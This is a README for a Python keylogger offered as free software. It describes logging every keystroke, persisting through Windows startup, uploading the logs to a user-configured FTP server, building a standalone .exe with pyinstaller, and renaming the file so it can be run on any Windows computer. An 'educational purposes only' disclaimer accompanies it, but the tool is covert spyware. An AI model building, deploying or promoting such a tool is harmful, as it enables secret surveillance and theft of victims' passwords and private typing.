# Python Keylogger

This is Python coded Keylogger application. Once run it will detect all keyboard events and save it to logs. The app run automatcly on windows startup, once runed for the first time.

Keylogger has FTP log functionallity. You can set you FTP credentials in code and the key pressed logs will be created on your ftp.
App will work On Window 7, 8, and 10.

## Requirements:
Python
PyWin32
PyHook
Pyinstaller

## Usage:
Download source files. Use pyinstaller to create standalone .exe file.
In terminal use command "pyinstaller --onefile run.py" which build executable file.
The build located the github repository contain fake dummy FTP credentails, so if you just use this run.exe file in repository the app wont send logs anywhere.
Make your own build for use with correct FTP credentials.

## Features:
To use app. Just run run.exe file. Then the app will do the rest. 
You can rename .exe file to anything you want.
Exe file is standalone, so you can run it from any Windows computer and folder.
To start program just double clik on run.exe file.
The program has funcitonally to start on windows load if the computer is restarted. It will always run on startup.

Termination: Kill the process in task manager. Delete the .exe file.

## Disclamer:
If you use this keylogger on a computer that does not belong to you you are responsible for the outcome.  
I created this application for educational purposes only, not for any illegal and unethical activity. 

## Licence:
This program is free software.
You are free to use or modify this application.

## Upgrades:
Feel free to contribute to fix any problems, or to submit an issue!
